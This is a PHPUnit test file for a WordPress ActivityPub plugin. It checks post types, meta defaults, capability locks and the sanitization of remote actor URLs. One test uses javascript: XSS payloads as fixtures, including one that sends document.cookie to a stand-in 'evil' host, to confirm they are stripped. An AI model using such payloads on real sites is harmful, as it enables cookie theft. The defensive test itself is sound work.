<?php
/**
 * Test file for Post Types.
 *
 * @package Activitypub
 */

namespace Activitypub\Tests;

use Activitypub\Collection\Remote_Actors;
use Activitypub\Post_Types;

/**
 * Test class for Post Types.
 *
 * @coversDefaultClass \Activitypub\Post_Types
 */
class Test_Post_Types extends \WP_UnitTestCase {

	/**
	 * Set up test environment.
	 */
	public function set_up(): void {
		parent::set_up();
		Post_Types::init();
	}

	/**
	 * Test prevent_empty_post_meta method.
	 *
	 * @covers ::prevent_empty_post_meta
	 */
	public function test_prevent_empty_post_meta() {
		$post_id = self::factory()->post->create( array( 'post_author' => 1 ) );

		// Storing the default value should be prevented.
		\update_post_meta( $post_id, 'activitypub_max_image_attachments', ACTIVITYPUB_MAX_IMAGE_ATTACHMENTS );
		$this->assertFalse( \metadata_exists( 'post', $post_id, 'activitypub_max_image_attachments' ) );

		// Storing a non-default value should work.
		\update_post_meta( $post_id, 'activitypub_max_image_attachments', ACTIVITYPUB_MAX_IMAGE_ATTACHMENTS + 3 );
		$this->assertTrue( \metadata_exists( 'post', $post_id, 'activitypub_max_image_attachments' ) );
		$this->assertEquals( ACTIVITYPUB_MAX_IMAGE_ATTACHMENTS + 3, \get_post_meta( $post_id, 'activitypub_max_image_attachments', true ) );

		\delete_post_meta( $post_id, 'activitypub_max_image_attachments' );
	}

	/**
	 * Test that the ap_tombstone post type is registered and non-public.
	 *
	 * @covers ::register_tombstone_post_type
	 */
	public function test_ap_tombstone_post_type_registered() {
		$this->assertTrue( \post_type_exists( 'ap_tombstone' ) );

		$post_type = \get_post_type_object( 'ap_tombstone' );
		$this->assertFalse( $post_type->public );
		$this->assertFalse( $post_type->publicly_queryable );
		$this->assertFalse( $post_type->show_ui );
		$this->assertFalse( $post_type->show_in_rest );
		$this->assertFalse( $post_type->delete_with_user );
		$this->assertTrue( $post_type->exclude_from_search );
	}

	/**
	 * A remote actor's URL and icon are attacker-controlled and stored verbatim,
	 * so the actor_info REST field must strip script-executing schemes before the
	 * admin UI renders them as links.
	 *
	 * @covers ::register_ap_actor_rest_field
	 */
	public function test_actor_info_rest_field_sanitizes_dangerous_urls() {
		Post_Types::register_ap_actor_rest_field();

		$post_id = Remote_Actors::create(
			array(
				'id'                => 'https://remote.example.com/actor/mallory',
				'type'              => 'Person',
				'url'               => "javascript:fetch('//evil/?c='+document.cookie)",
				'icon'              => array(
					'type' => 'Image',
					'url'  => 'javascript:alert(document.domain)',
				),
				'inbox'             => 'https://remote.example.com/actor/mallory/inbox',
				'name'              => 'Mallory',
				'preferredUsername' => 'mallory',
			)
		);
		$this->assertIsInt( $post_id );

		$info = $this->get_actor_info( $post_id );

		$this->assertSame( '', $info['url'], 'A javascript: actor URL should be stripped.' );
		$this->assertSame( '', $info['icon'], 'A javascript: icon URL should be stripped.' );
	}

	/**
	 * Legitimate http(s) actor URLs must pass through the actor_info REST field untouched.
	 *
	 * @covers ::register_ap_actor_rest_field
	 */
	public function test_actor_info_rest_field_preserves_safe_urls() {
		Post_Types::register_ap_actor_rest_field();

		$post_id = Remote_Actors::create(
			array(
				'id'                => 'https://remote.example.com/actor/alice',
				'type'              => 'Person',
				'url'               => 'https://remote.example.com/@alice',
				'icon'              => array(
					'type' => 'Image',
					'url'  => 'https://remote.example.com/avatar.png',
				),
				'inbox'             => 'https://remote.example.com/actor/alice/inbox',
				'name'              => 'Alice',
				'preferredUsername' => 'alice',
			)
		);
		$this->assertIsInt( $post_id );

		$info = $this->get_actor_info( $post_id );

		$this->assertSame( 'https://remote.example.com/@alice', $info['url'] );
		$this->assertSame( 'https://remote.example.com/avatar.png', $info['icon'] );
	}

	/**
	 * Invoke the registered actor_info REST field callback for a given actor post.
	 *
	 * @param int $post_id Remote actor post ID.
	 * @return array The actor_info payload.
	 */
	private function get_actor_info( $post_id ) {
		global $wp_rest_additional_fields;

		$callback = $wp_rest_additional_fields[ Remote_Actors::POST_TYPE ]['actor_info']['get_callback'];

		return \call_user_func( $callback, array( 'id' => $post_id ) );
	}

	/**
	 * Nobody may create, edit, publish or delete posts of a post type only the plugin writes.
	 *
	 * Loops over every post type the plugin registers, so a new one fails until it is decided:
	 * locked, or listed here as editable with the reason.
	 *
	 * @covers ::register_inbox_post_type
	 * @covers ::register_outbox_post_type
	 * @covers ::register_oauth_post_types
	 * @covers ::register_tombstone_post_type
	 */
	public function test_internal_post_types_are_locked() {
		$editable = array(
			// Users manage their own profile fields.
			'ap_extrafield',
			'ap_extrafield_blog',
			// The admin app reads them through the REST API in the edit context, which needs the edit caps.
			'ap_post',
			'ap_actor',
		);

		\wp_set_current_user( self::factory()->user->create( array( 'role' => 'administrator' ) ) );

		$checked = 0;
		foreach ( \get_post_types( array(), 'names' ) as $post_type ) {
			if ( 0 !== \strpos( $post_type, 'ap_' ) || \in_array( $post_type, $editable, true ) ) {
				continue;
			}

			$post_id = \wp_insert_post(
				array(
					'post_type'   => $post_type,
					'post_status' => 'publish',
					'post_title'  => 'internal',
				)
			);

			$this->assertFalse( \current_user_can( \get_post_type_object( $post_type )->cap->create_posts ), $post_type );
			$this->assertFalse( \current_user_can( 'edit_post', $post_id ), $post_type );
			$this->assertFalse( \current_user_can( 'delete_post', $post_id ), $post_type );
			$this->assertFalse( \current_user_can( 'publish_post', $post_id ), $post_type );
			++$checked;
		}

		$this->assertSame( 4, $checked, 'Outbox, Inbox, OAuth Client and Tombstone are locked.' );
	}
}
